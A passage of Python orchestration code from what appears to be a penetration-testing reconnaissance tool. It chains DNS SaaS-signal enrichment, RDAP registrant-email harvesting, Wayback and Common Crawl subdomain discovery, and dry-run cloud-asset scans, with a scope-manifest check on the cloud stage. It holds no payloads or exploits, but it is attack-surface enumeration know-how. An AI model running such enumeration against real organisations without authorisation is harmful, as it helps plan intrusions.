                    prepared_dns_domain_summaries = _run_inprocess_batch(
                        applied_dns_domain_results,
                        _prepare_dns_domain_summary_item,
                        max_workers=parallel_workers,
                        progress_label=f"{iteration}.G DNS summary prep",
                        progress_callback=_record_batch_progress,
                    )
                    dns_summary_totals = {
                        "domain_added": 0,
                        "hosts_queried": 0,
                    }
                    if len(prepared_dns_domain_summaries) > 1:
                        _log(
                            f"{iteration}.G DNS summary merge",
                            "[dim]sequential dispatch x1[/dim]  [dim]summary accumulation order preserved[/dim]",
                        )
                    _run_inprocess_batch(
                        prepared_dns_domain_summaries,
                        lambda item: _apply_dns_domain_summary_item(
                            item,
                            summary_totals_out=dns_summary_totals,
                            aggregate_signals_out=aggregate_signals_set,
                        ),
                        max_workers=1,
                        progress_label=f"{iteration}.G DNS summary merge",
                        progress_callback=_record_batch_progress,
                    )
                    dns_total_added = int(dns_summary_totals["domain_added"])
                    total_dns_hosts_queried = int(dns_summary_totals["hosts_queried"])
                    con.commit()
                finally:
                    con.close()
                aggregate_saas_signals = sorted(aggregate_signals_set)
            _log(
                f"{iteration}.G DNS enrichment",
                (
                    f"queried {total_dns_hosts_queried} host(s), +{dns_total_added} CNAME host(s), "
                    f"SaaS signals: {','.join(aggregate_saas_signals[:8]) if aggregate_saas_signals else 'none'}"
                ),
            )
            if aggregate_saas_signals:
                _cli_audit(
                    db_path, engagement_id, "orchestrator", "kill_chain",
                    "dns_saas_signals", target=",".join(root_domains),
                    result=f"signals={','.join(aggregate_saas_signals)}",
                )

        # ─── Fan-out H: Whois / RDAP registrant enrichment ────────────
        # Runs every iteration so paranoid re-checks catch any registrant
        # data changes mid-run. Adds registrant emails to the emails table
        # so fan-out E (next iteration) can chain them.
        if not root_domains:
            _emit_no_domain_skip_log(
                f"{iteration}.H whois/RDAP",
                f"[dim]skipped (seed_type={seed_type} has no domain)[/dim]",
                progress_label_prefix=f"{iteration}.H RDAP",
                max_workers=parallel_workers,
                progress_callback=_record_batch_progress,
            )
        elif dry_run_all:
            _emit_prepared_notice_log(
                f"{iteration}.H whois/RDAP",
                "[yellow]DRY-RUN-ALL[/yellow] would query rdap.org",
                progress_label_prefix=f"{iteration}.H RDAP",
                notice_suffix="dry-run",
                order_note="dry-run notice order preserved",
                max_workers=parallel_workers,
                progress_callback=_record_batch_progress,
            )
            pending_rdap_domains, skipped_rdap_domains = _partition_root_domains(
                root_domains,
                completed_domains=completed_rdap_domains,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.H root-domain prep",
                progress_callback=_record_batch_progress,
            )
            rdap_resume_skip_log_inputs = [
                (f"{iteration}.H whois/RDAP", root_domain)
                for root_domain in skipped_rdap_domains
            ]
            if len(rdap_resume_skip_log_inputs) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.H RDAP skip-log prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(rdap_resume_skip_log_inputs))}[/dim]",
                )
            prepared_rdap_resume_skip_logs = _run_inprocess_batch(
                rdap_resume_skip_log_inputs,
                _prepare_resume_skip_log_entry,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.H RDAP skip-log prep",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_rdap_resume_skip_logs) > 1:
                _log(
                    f"{iteration}.H RDAP skip-log merge",
                    "[dim]sequential dispatch x1[/dim]  [dim]resume-skip log order preserved[/dim]",
                )
            _run_inprocess_batch(
                prepared_rdap_resume_skip_logs,
                _apply_prepared_log_entry,
                max_workers=1,
                progress_label=f"{iteration}.H RDAP skip-log merge",
                progress_callback=_record_batch_progress,
            )
            rdap_dry_run_entries = [
                (root_domain, "fanout_h_rdap")
                for root_domain in pending_rdap_domains
            ]
            if len(rdap_dry_run_entries) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.H dry-run finalize prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(rdap_dry_run_entries))}[/dim]",
                )
            prepared_rdap_dry_run_entries = _run_inprocess_batch(
                rdap_dry_run_entries,
                _prepare_domain_dry_run_skip_entry,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.H dry-run finalize prep",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_rdap_dry_run_entries) > 1:
                _log(
                    f"{iteration}.H dry-run finalize",
                    "[dim]sequential dispatch x1[/dim]  [dim]dry-run skip order preserved[/dim]",
                )
            _run_inprocess_batch(
                prepared_rdap_dry_run_entries,
                _apply_domain_dry_run_skip_entry,
                max_workers=1,
                progress_label=f"{iteration}.H dry-run finalize",
                progress_callback=_record_batch_progress,
            )
        else:
            pending_rdap_domains, skipped_rdap_domains = _partition_root_domains(
                root_domains,
                completed_domains=completed_rdap_domains,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.H root-domain prep",
                progress_callback=_record_batch_progress,
            )
            rdap_resume_skip_log_inputs = [
                (f"{iteration}.H whois/RDAP", root_domain)
                for root_domain in skipped_rdap_domains
            ]
            if len(rdap_resume_skip_log_inputs) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.H RDAP skip-log prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(rdap_resume_skip_log_inputs))}[/dim]",
                )
            prepared_rdap_resume_skip_logs = _run_inprocess_batch(
                rdap_resume_skip_log_inputs,
                _prepare_resume_skip_log_entry,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.H RDAP skip-log prep",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_rdap_resume_skip_logs) > 1:
                _log(
                    f"{iteration}.H RDAP skip-log merge",
                    "[dim]sequential dispatch x1[/dim]  [dim]resume-skip log order preserved[/dim]",
                )
            _run_inprocess_batch(
                prepared_rdap_resume_skip_logs,
                _apply_prepared_log_entry,
                max_workers=1,
                progress_label=f"{iteration}.H RDAP skip-log merge",
                progress_callback=_record_batch_progress,
            )
            if not pending_rdap_domains:
                _emit_no_pending_resume_skip_log(
                    f"{iteration}.H whois/RDAP",
                    "[dim]resume skip — no pending root domains[/dim]",
                    progress_label_prefix=f"{iteration}.H RDAP",
                    max_workers=parallel_workers,
                    progress_callback=_record_batch_progress,
                )
            else:
                rdap_handles = _start_seed_run_handles_from_contexts(
                    [
                        _seed_context(
                            root_domain,
                            "domain",
                            source="orchestrator",
                            metadata={"iteration": iteration},
                        )
                        for root_domain in pending_rdap_domains
                    ],
                    loop_name_value="fanout_h_rdap",
                    base_metadata_value={},
                    progress_label_prefix=f"{iteration}.H RDAP",
                )
                if len(pending_rdap_domains) > 1 and parallel_workers > 1:
                    _log(
                        f"{iteration}.H whois/RDAP",
                        f"[dim]parallel dispatch x{min(parallel_workers, len(pending_rdap_domains))}[/dim]",
                    )
                rdap_results = _run_callable_batch(
                    pending_rdap_domains,
                    lambda root_domain: {
                        "root_domain": root_domain,
                        "rdap": _rdap_lookup(root_domain, timeout=10.0),
                    },
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.H whois/RDAP",
                    progress_callback=_record_batch_progress,
                )
                rdap_parse_items: list[tuple[str, Any]] = []
                _run_ordered_inprocess_apply_batch(
                    list(enumerate(rdap_results)),
                    lambda item: _apply_indexed_pair_item(
                        item,
                        leading_values=pending_rdap_domains,
                        pair_items_out=rdap_parse_items,
                    ),
                    progress_label=f"{iteration}.H RDAP result input apply",
                    progress_callback=_record_batch_progress,
                    order_note="RDAP result input order preserved",
                )
                if len(rdap_parse_items) > 1 and parallel_workers > 1:
                    _log(
                        f"{iteration}.H RDAP result parse",
                        f"[dim]parallel parse x{min(parallel_workers, len(rdap_parse_items))}[/dim]",
                    )
                prepared_rdap_results = _run_inprocess_batch(
                    rdap_parse_items,
                    _prepare_rdap_result,
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.H RDAP result parse",
                    progress_callback=_record_batch_progress,
                )
                rdap_result_prep_items: list[tuple[Any, Any]] = []
                _run_ordered_inprocess_apply_batch(
                    list(enumerate(prepared_rdap_results)),
                    lambda item: _apply_indexed_pair_item(
                        item,
                        leading_values=rdap_handles,
                        pair_items_out=rdap_result_prep_items,
                    ),
                    progress_label=f"{iteration}.H RDAP result prep apply",
                    progress_callback=_record_batch_progress,
                    order_note="RDAP result handle order preserved",
                )
                if len(rdap_result_prep_items) > 1 and parallel_workers > 1:
                    _log(
                        f"{iteration}.H RDAP result prep",
                        f"[dim]parallel parse x{min(parallel_workers, len(rdap_result_prep_items))}[/dim]",
                    )
                prepared_rdap_domain_results = _run_inprocess_batch(
                    rdap_result_prep_items,
                    _prepare_rdap_domain_result_entry,
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.H RDAP result prep",
                    progress_callback=_record_batch_progress,
                )
                if len(prepared_rdap_domain_results) > 1:
                    _log(
                        f"{iteration}.H RDAP finalize",
                        "[dim]sequential dispatch x1[/dim]  [dim]persistence/finalization order preserved[/dim]",
                    )
                applied_rdap_domain_results = _run_inprocess_batch(
                    prepared_rdap_domain_results,
                    lambda item: _apply_rdap_domain_result_entry(
                        item,
                        db_path_value=db_path,
                        engagement_id_value=engagement_id,
                        max_workers_value=parallel_workers,
                    ),
                    max_workers=1,
                    progress_label=f"{iteration}.H RDAP finalize",
                    progress_callback=_record_batch_progress,
                )
                if len(applied_rdap_domain_results) > 1 and parallel_workers > 1:
                    _log(
                        f"{iteration}.H RDAP finalize prep",
                        (
                            f"[dim]parallel parse x"
                            f"{min(parallel_workers, len(applied_rdap_domain_results))}[/dim]"
                        ),
                    )
                prepared_rdap_finalize_entries = _run_inprocess_batch(
                    applied_rdap_domain_results,
                    _prepare_rdap_domain_finalize_entry,
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.H RDAP finalize prep",
                    progress_callback=_record_batch_progress,
                )
                _run_inprocess_batch(
                    prepared_rdap_finalize_entries,
                    _apply_module_seed_run_finalization_entry,
                    max_workers=1,
                    progress_label=f"{iteration}.H RDAP finalize apply",
                    progress_callback=_record_batch_progress,
                )

        # ─── Fan-out I: Wayback Machine URL history ───────────────────
        # Runs every iteration. Default limit=500 URLs; --wayback-full
        # paginates unbounded. Extracts subdomains from historical URLs -
        # frequently reveals deprecated services still resolvable.
        if not root_domains:
            _emit_no_domain_skip_log(
                f"{iteration}.I Wayback CDX",
                f"[dim]skipped (seed_type={seed_type} has no domain)[/dim]",
                progress_label_prefix=f"{iteration}.I Wayback",
                max_workers=parallel_workers,
                progress_callback=_record_batch_progress,
            )
        elif dry_run_all:
            _emit_prepared_notice_log(
                f"{iteration}.I Wayback CDX",
                "[yellow]DRY-RUN-ALL[/yellow] would query archive.org CDX",
                progress_label_prefix=f"{iteration}.I Wayback",
                notice_suffix="dry-run",
                order_note="dry-run notice order preserved",
                max_workers=parallel_workers,
                progress_callback=_record_batch_progress,
            )
            pending_wayback_domains, skipped_wayback_domains = _partition_root_domains(
                root_domains,
                completed_domains=completed_wayback_domains,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.I root-domain prep",
                progress_callback=_record_batch_progress,
            )
            wayback_resume_skip_log_inputs = [
                (f"{iteration}.I Wayback CDX", root_domain)
                for root_domain in skipped_wayback_domains
            ]
            if len(wayback_resume_skip_log_inputs) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.I Wayback skip-log prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(wayback_resume_skip_log_inputs))}[/dim]",
                )
            prepared_wayback_resume_skip_logs = _run_inprocess_batch(
                wayback_resume_skip_log_inputs,
                _prepare_resume_skip_log_entry,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.I Wayback skip-log prep",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_wayback_resume_skip_logs) > 1:
                _log(
                    f"{iteration}.I Wayback skip-log merge",
                    "[dim]sequential dispatch x1[/dim]  [dim]resume-skip log order preserved[/dim]",
                )
            _run_inprocess_batch(
                prepared_wayback_resume_skip_logs,
                _apply_prepared_log_entry,
                max_workers=1,
                progress_label=f"{iteration}.I Wayback skip-log merge",
                progress_callback=_record_batch_progress,
            )
            wayback_dry_run_entries = [
                (root_domain, "fanout_i_wayback")
                for root_domain in pending_wayback_domains
            ]
            if len(wayback_dry_run_entries) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.I dry-run finalize prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(wayback_dry_run_entries))}[/dim]",
                )
            prepared_wayback_dry_run_entries = _run_inprocess_batch(
                wayback_dry_run_entries,
                _prepare_domain_dry_run_skip_entry,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.I dry-run finalize prep",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_wayback_dry_run_entries) > 1:
                _log(
                    f"{iteration}.I dry-run finalize",
                    "[dim]sequential dispatch x1[/dim]  [dim]dry-run skip order preserved[/dim]",
                )
            _run_inprocess_batch(
                prepared_wayback_dry_run_entries,
                _apply_domain_dry_run_skip_entry,
                max_workers=1,
                progress_label=f"{iteration}.I dry-run finalize",
                progress_callback=_record_batch_progress,
            )
        else:
            wb_limit = 0 if wayback_full else 500
            pending_wayback_domains, skipped_wayback_domains = _partition_root_domains(
                root_domains,
                completed_domains=completed_wayback_domains,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.I root-domain prep",
                progress_callback=_record_batch_progress,
            )
            wayback_resume_skip_log_inputs = [
                (f"{iteration}.I Wayback CDX", root_domain)
                for root_domain in skipped_wayback_domains
            ]
            if len(wayback_resume_skip_log_inputs) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.I Wayback skip-log prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(wayback_resume_skip_log_inputs))}[/dim]",
                )
            prepared_wayback_resume_skip_logs = _run_inprocess_batch(
                wayback_resume_skip_log_inputs,
                _prepare_resume_skip_log_entry,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.I Wayback skip-log prep",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_wayback_resume_skip_logs) > 1:
                _log(
                    f"{iteration}.I Wayback skip-log merge",
                    "[dim]sequential dispatch x1[/dim]  [dim]resume-skip log order preserved[/dim]",
                )
            _run_inprocess_batch(
                prepared_wayback_resume_skip_logs,
                _apply_prepared_log_entry,
                max_workers=1,
                progress_label=f"{iteration}.I Wayback skip-log merge",
                progress_callback=_record_batch_progress,
            )
            if not pending_wayback_domains:
                _emit_no_pending_resume_skip_log(
                    f"{iteration}.I Wayback CDX",
                    "[dim]resume skip — no pending root domains[/dim]",
                    progress_label_prefix=f"{iteration}.I Wayback",
                    max_workers=parallel_workers,
                    progress_callback=_record_batch_progress,
                )
            else:
                wayback_handles = _start_seed_run_handles_from_contexts(
                    [
                        _seed_context(
                            root_domain,
                            "domain",
                            source="orchestrator",
                            metadata={"iteration": iteration},
                        )
                        for root_domain in pending_wayback_domains
                    ],
                    loop_name_value="fanout_i_wayback",
                    base_metadata_value={},
                    progress_label_prefix=f"{iteration}.I Wayback",
                )
                passive_archive_workers = _passive_archive_lookup_max_workers(parallel_workers)
                if len(pending_wayback_domains) > 1:
                    _log(
                        f"{iteration}.I Wayback CDX",
                        (
                            f"[dim]provider-bounded dispatch x"
                            f"{min(passive_archive_workers, len(pending_wayback_domains))}[/dim]"
                        ),
                    )
                wayback_results = _run_callable_batch(
                    pending_wayback_domains,
                    lambda root_domain: (
                        lambda wayback_url_values, commoncrawl_url_values: {
                            "root_domain": root_domain,
                            "urls": _dedupe_url_list(
                                [
                                    *wayback_url_values,
                                    *commoncrawl_url_values,
                                ]
                            ),
                            "url_metadata": _archive_url_source_metadata(
                                root_domain=root_domain,
                                wayback_urls=wayback_url_values,
                                commoncrawl_urls=commoncrawl_url_values,
                            ),
                        }
                    )(
                        _wayback_urls(
                            root_domain,
                            timeout=30.0 if wayback_full else 15.0,
                            limit=wb_limit,
                        ),
                        _commoncrawl_urls(
                            root_domain,
                            timeout=30.0 if wayback_full else 15.0,
                        ),
                    ),
                    max_workers=passive_archive_workers,
                    progress_label=f"{iteration}.I Wayback CDX",
                    progress_callback=_record_batch_progress,
                )
                wayback_host_input_sources = list(enumerate(wayback_results))
                if len(wayback_host_input_sources) > 1 and parallel_workers > 1:
                    _log(
                        f"{iteration}.I Wayback host input prep",
                        (
                            f"[dim]parallel parse x"
                            f"{min(parallel_workers, len(wayback_host_input_sources))}[/dim]"
                        ),
                    )
                prepared_wayback_host_parse_groups = _run_inprocess_batch(
                    wayback_host_input_sources,
                    _prepare_wayback_host_parse_input_group,
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.I Wayback host input prep",
                    progress_callback=_record_batch_progress,
                )
                wayback_host_parse_items: list[tuple[int, str]] = []
                wayback_host_candidate_groups: list[list[Any]] = [
                    [] for _ in wayback_results
                ]
                if len(prepared_wayback_host_parse_groups) > 1:
                    _log(
                        f"{iteration}.I Wayback host input merge",
                        "[dim]sequential dispatch x1[/dim]  [dim]flattened URL order preserved[/dim]",
                    )
                _run_inprocess_batch(
                    prepared_wayback_host_parse_groups,
                    lambda item: _apply_wayback_host_parse_input_group(
                        item,
                        host_parse_items_out=wayback_host_parse_items,
                    ),
                    max_workers=1,
                    progress_label=f"{iteration}.I Wayback host input merge",
                    progress_callback=_record_batch_progress,
                )
                if len(wayback_host_parse_items) > 1 and parallel_workers > 1:
                    _log(
                        f"{iteration}.I Wayback host parse",
                        (
                            f"[dim]parallel parse x"
                            f"{min(parallel_workers, len(wayback_host_parse_items))}[/dim]"
                        ),
                    )
                parsed_wayback_host_entries = _run_inprocess_batch(
                    wayback_host_parse_items,
                    _prepare_wayback_host_parse_item,
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.I Wayback host parse",
                    progress_callback=_record_batch_progress,
                )
                if len(parsed_wayback_host_entries) > 1 and parallel_workers > 1:
                    _log(
                        f"{iteration}.I Wayback host group prep",
                        (
                            f"[dim]parallel parse x"
                            f"{min(parallel_workers, len(parsed_wayback_host_entries))}[/dim]"
                        ),
                    )
                prepared_wayback_host_group_items = _run_inprocess_batch(
                    parsed_wayback_host_entries,
                    _prepare_wayback_host_group_item,
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.I Wayback host group prep",
                    progress_callback=_record_batch_progress,
                )
                if len(prepared_wayback_host_group_items) > 1:
                    _log(
                        f"{iteration}.I Wayback host group merge",
                        "[dim]sequential dispatch x1[/dim]  [dim]grouped host order preserved[/dim]",
                    )
                _run_inprocess_batch(
                    prepared_wayback_host_group_items,
                    lambda item: _apply_wayback_host_group_item(
                        item,
                        host_candidate_groups_out=wayback_host_candidate_groups,
                    ),
                    max_workers=1,
                    progress_label=f"{iteration}.I Wayback host group merge",
                    progress_callback=_record_batch_progress,
                )
                wayback_domain_result_sources: list[tuple[str, Any, Any, list[Any]]] = []
                _run_ordered_inprocess_apply_batch(
                    list(enumerate(wayback_results)),
                    lambda item: _apply_indexed_wayback_result_source_item(
                        item,
                        domains=pending_wayback_domains,
                        handles=wayback_handles,
                        host_candidate_groups=wayback_host_candidate_groups,
                        result_sources_out=wayback_domain_result_sources,
                    ),
                    progress_label=f"{iteration}.I Wayback result input apply",
                    progress_callback=_record_batch_progress,
                    order_note="Wayback result input order preserved",
                )
                if len(wayback_domain_result_sources) > 1 and parallel_workers > 1:
                    _log(
                        f"{iteration}.I Wayback result input prep",
                        (
                            f"[dim]parallel parse x"
                            f"{min(parallel_workers, len(wayback_domain_result_sources))}[/dim]"
                        ),
                    )
                wayback_domain_result_inputs = _run_inprocess_batch(
                    wayback_domain_result_sources,
                    _prepare_wayback_domain_result_input,
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.I Wayback result input prep",
                    progress_callback=_record_batch_progress,
                )
                if len(wayback_domain_result_inputs) > 1 and parallel_workers > 1:
                    _log(
                        f"{iteration}.I Wayback result prep",
                        f"[dim]parallel parse x{min(parallel_workers, len(wayback_domain_result_inputs))}[/dim]",
                    )
                prepared_wayback_domain_results = _run_inprocess_batch(
                    wayback_domain_result_inputs,
                    lambda item: _prepare_wayback_domain_result_entry(
                        item,
                        wayback_full_value=wayback_full,
                    ),
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.I Wayback result prep",
                    progress_callback=_record_batch_progress,
                )
                if len(prepared_wayback_domain_results) > 1:
                    _log(
                        f"{iteration}.I Wayback finalize",
                        "[dim]sequential dispatch x1[/dim]  [dim]persistence/finalization order preserved[/dim]",
                    )
                applied_wayback_domain_results = _run_inprocess_batch(
                    prepared_wayback_domain_results,
                    lambda item: _apply_wayback_domain_result_entry(
                        item,
                        db_path_value=db_path,
                        engagement_id_value=engagement_id,
                        max_workers_value=parallel_workers,
                        wayback_full_value=wayback_full,
                    ),
                    max_workers=1,
                    progress_label=f"{iteration}.I Wayback finalize",
                    progress_callback=_record_batch_progress,
                )
                if len(applied_wayback_domain_results) > 1 and parallel_workers > 1:
                    _log(
                        f"{iteration}.I Wayback finalize prep",
                        (
                            f"[dim]parallel parse x"
                            f"{min(parallel_workers, len(applied_wayback_domain_results))}[/dim]"
                        ),
                    )
                prepared_wayback_finalize_entries = _run_inprocess_batch(
                    applied_wayback_domain_results,
                    _prepare_wayback_domain_finalize_entry,
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.I Wayback finalize prep",
                    progress_callback=_record_batch_progress,
                )
                _run_inprocess_batch(
                    prepared_wayback_finalize_entries,
                    _apply_module_seed_run_finalization_entry,
                    max_workers=1,
                    progress_label=f"{iteration}.I Wayback finalize apply",
                    progress_callback=_record_batch_progress,
                )

        # ─── Fan-out J: Cloud auto-scan for newly-discovered refs ─────
        # Runs the cloud scanner (--dry-run) against every project ref
        # discovered THIS iteration but not yet scanned. Deduped via
        # processed_cloud_refs.
        if not skip_cloud:
            cloud_commands_map = {
                "supabase":            ("cloud", "supabase"),
                "firebase":            ("cloud", "firebase"),
                "aws_s3":              None,
                "do_spaces":           None,
                "gcs":                 None,
                "azure_blob":          None,
                "amplify":             None,
                "gcp_appspot":         None,
                "gcp_cloudfunctions":  None,
                "cloudflare_pages":    None,
                "cloudflare_worker":   None,
                "cloudflare_r2":       None,
                "github_pages":        None,
                "gitlab_pages":        None,
                "vercel":              None,
                "netlify":             None,
            }
            cloud_target_source_groups = [
                {service: refs}
                for service, refs in all_cloud_refs.items()
                if service in cloud_commands_map
            ]
            source_progress_label = f"{iteration}.J cloud target source prep"
            if cloud_target_source_groups and len(cloud_target_source_groups) > 1 and parallel_workers > 1:
                _log(
                    source_progress_label,
                    f"[dim]parallel parse x{min(parallel_workers, len(cloud_target_source_groups))}[/dim]",
                )
            prepared_cloud_target_sources = _run_inprocess_batch(
                cloud_target_source_groups,
                _prepare_cloud_ref_batch_item,
                max_workers=parallel_workers,
                progress_label=source_progress_label,
                progress_callback=_record_batch_progress,
            )
            raw_cloud_targets: list[tuple[str, str]] = []
            _run_ordered_inprocess_apply_batch(
                prepared_cloud_target_sources,
                lambda item: _apply_cloud_target_source_group_item(
                    item,
                    raw_targets_out=raw_cloud_targets,
                ),
                progress_label=_derive_apply_progress_label(source_progress_label),
                progress_callback=_record_batch_progress,
                order_note="cloud-target source order preserved",
            )
            if raw_cloud_targets and len(raw_cloud_targets) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.J cloud target prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(raw_cloud_targets))}[/dim]",
                )
            prepared_cloud_targets = _run_inprocess_batch(
                raw_cloud_targets,
                lambda item: _prepare_pending_cloud_target(
                    item,
                    cloud_commands_map=cloud_commands_map,
                    processed_refs=processed_cloud_refs,
                ),
                max_workers=parallel_workers,
                progress_label=f"{iteration}.J cloud target prep",
                progress_callback=_record_batch_progress,
            )
            pending_cloud_targets: list[dict[str, Any]] = []
            if len(prepared_cloud_targets) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.J cloud pending prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(prepared_cloud_targets))}[/dim]",
                )
            prepared_pending_cloud_targets = _run_inprocess_batch(
                prepared_cloud_targets,
                lambda item: {
                    "service": str(item["service"]),
                    "ref": str(item["ref"]),
                    "already_processed": bool(item.get("already_processed")),
                    "pending_target": None
                    if bool(item.get("already_processed"))
                    else {
                        "service": str(item["service"]),
                        "ref": str(item["ref"]),
                        "key": str(item["key"]),
                        "group": str(item["group"]),
                        "subcommand": str(item["subcommand"]),
                    },
                },
                max_workers=parallel_workers,
                progress_label=f"{iteration}.J cloud pending prep",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_pending_cloud_targets) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.J cloud pending reduction",
                    f"[dim]parallel parse x{min(parallel_workers, len(prepared_pending_cloud_targets))}[/dim]",
                )
            prepared_cloud_pending_reductions = _run_inprocess_batch(
                prepared_pending_cloud_targets,
                _prepare_cloud_pending_schedule_reduction,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.J cloud pending reduction",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_cloud_pending_reductions) > 1:
                _log(
                    f"{iteration}.J cloud pending merge",
                    "[dim]sequential dispatch x1[/dim]  [dim]skip-log merge order preserved[/dim]",
                )
            _run_inprocess_batch(
                prepared_cloud_pending_reductions,
                lambda item: _apply_cloud_pending_schedule_reduction_item(
                    item,
                    pending_targets_out=pending_cloud_targets,
                ),
                max_workers=1,
                progress_label=f"{iteration}.J cloud pending merge",
                progress_callback=_record_batch_progress,
            )
            if pending_cloud_targets:
                scoped_pending_cloud_targets: list[dict[str, Any]] = []
                scope_items = _run_inprocess_batch(
                    pending_cloud_targets,
                    lambda item: {
                        "target": item,
                        "decision": _cloud_asset_scope_decision(
                            str(item.get("service") or ""),
                            str(item.get("ref") or ""),
                        ),
                    },
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.J cloud scope prep",
                    progress_callback=_record_batch_progress,
                )
                _run_ordered_inprocess_apply_batch(
                    scope_items,
                    lambda item: (
                        scoped_pending_cloud_targets.append(item["target"])
                        if bool(item.get("decision", {}).get("allowed"))
                        else (
                            _record_cloud_asset_scope_denied(
                                str(item.get("target", {}).get("service") or ""),
                                str(item.get("target", {}).get("ref") or ""),
                                str(item.get("decision", {}).get("reason") or "scope_manifest_denied"),
                            ),
                            processed_cloud_refs.add(str(item.get("target", {}).get("key") or "")),
                        )
                    ),
                    progress_label=f"{iteration}.J cloud scope apply",
                    progress_callback=_record_batch_progress,
                    order_note="cloud scope decision order preserved",
                )
                pending_cloud_targets = scoped_pending_cloud_targets
            if not pending_cloud_targets:
                _log(f"{iteration}.J cloud scans",
                     "[dim]no new cloud refs to scan[/dim]")
            else:
                if len(pending_cloud_targets) > 1 and parallel_workers > 1:
                    _log(
                        f"{iteration}.J cloud scan spec prep",
                        f"[dim]parallel parse x{min(parallel_workers, len(pending_cloud_targets))}[/dim]",
                    )
                prepared_j_specs = _run_inprocess_batch(
                    pending_cloud_targets,
                    lambda item: (
                        None
                        if not item["group"] or not item["subcommand"]
                        else ModuleDispatchSpec(
                            cmd_argv=[
                                str(item["group"]),
                                str(item["subcommand"]),
                                "--engagement",
                                engagement,
                                "--project-ref",
                                str(item["ref"]),
                                "--dry-run",
                            ],
                            label=f"{iteration}.J cloud {item['service']} ({item['ref']})",
                            loop_name="fanout_j_cloud_scan",
                            seed_contexts=[
                                _seed_context(
                                    str(item["key"]),
                                    "other",
                                    source="cross_reference",
                                    depth=2,
                                    confidence=0.8,
                                    metadata={"service": str(item["service"]), "ref": str(item["ref"])},
                                )
                            ],
                            metadata={"iteration": iteration, "service": str(item["service"])},
                        )
                    ),
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.J cloud scan spec prep",
                    progress_callback=_record_batch_progress,
                )
                if len(prepared_j_specs) > 1 and parallel_workers > 1:
                    _log(
                        f"{iteration}.J cloud scan spec reduction",
                        f"[dim]parallel parse x{min(parallel_workers, len(prepared_j_specs))}[/dim]",
                    )
                prepared_j_spec_reductions = _run_inprocess_batch(
                    prepared_j_specs,
                    _prepare_cloud_spec_reduction,
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.J cloud scan spec reduction",
                    progress_callback=_record_batch_progress,
                )
                j_specs: list[ModuleDispatchSpec] = []
                _run_ordered_inprocess_apply_batch(
                    prepared_j_spec_reductions,
                    lambda item: _apply_cloud_spec_reduction_item(
                        item,
                        specs_out=j_specs,
                    ),
                    progress_label=f"{iteration}.J cloud scan spec apply",
                    progress_callback=_record_batch_progress,
                    order_note="cloud-spec order preserved",
                )
                if len(j_specs) > 1 and parallel_workers > 1:
                    _log(
                        f"{iteration}.J cloud scans",
                        f"[dim]parallel dispatch x{min(parallel_workers, len(j_specs))}[/dim]",
                    )
                if j_specs:
                    _run_module_batch(
                        j_specs,
                        _run_module,
                        max_workers=parallel_workers,
                        progress_label=f"{iteration}.J cloud scans",
                        progress_callback=_record_batch_progress,
                    )
                if not dry_run_all:
                    validation_batch = run_cloud_asset_validate_batch(
                        engagement_id,
                        [
                            (str(item["service"]), str(item["ref"]))
                            for item in pending_cloud_targets
                        ],
                        db_path,
                        max_workers=parallel_workers,
                        progress_label=f"{iteration}.J cloud validation",
                        progress_callback=_record_validation_progress,
                    )
                    validation_results = validation_batch.get("results") or []
                    validation_log_items: list[tuple[dict[str, Any], dict[str, Any]]] = []
                    _run_ordered_inprocess_apply_batch(
                        list(enumerate(validation_results)),
                        lambda item: _apply_indexed_pair_item(
                            item,
                            leading_values=pending_cloud_targets,
                            pair_items_out=validation_log_items,
                        ),
                        progress_label=f"{iteration}.J cloud validation result input apply",
                        progress_callback=_record_batch_progress,
                        order_note="cloud validation result input order preserved",
                    )
                    if len(validation_log_items) > 1 and parallel_workers > 1:
                        _log(
                            f"{iteration}.J cloud validation result prep",
                            f"[dim]parallel parse x{min(parallel_workers, len(validation_log_items))}[/dim]",
                        )
                    prepared_validation_logs = _run_inprocess_batch(
                        validation_log_items,
                        _prepare_cloud_validation_log_entry,
                        max_workers=parallel_workers,
